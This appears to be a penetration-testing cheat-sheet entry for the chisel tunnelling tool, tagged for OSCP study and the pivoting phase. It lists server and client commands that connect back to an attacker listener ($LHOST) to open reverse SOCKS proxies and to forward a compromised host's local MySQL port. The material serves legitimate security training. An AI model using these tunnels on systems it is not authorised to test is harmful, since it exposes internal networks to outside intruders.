---
variants:
  - label: server-reverse
    command: |
      chisel server -p $LPORT --reverse
  - label: client-reverse-socks
    command: |
      chisel client $LHOST:$LPORT R:socks
  - label: client-reverse-fwd
    command: |
      chisel client $LHOST:$LPORT R:$LPORT:127.0.0.1:3306
  - label: server-forward-socks
    command: |
      chisel server -p $LPORT --socks5
  - label: client-forward-socks
    command: |
      chisel client $IP:$LPORT socks
description: Fast TCP/UDP tunnel over HTTP for reverse SOCKS proxies and port forwarding through a foothold
os: [Linux, Windows]
category: [oscp, cli]
service: [HTTP]
phase: [Pivoting]
references:
  - https://gitlab.com/kalilinux/packages/chisel
  - https://github.com/jpillora/chisel
---
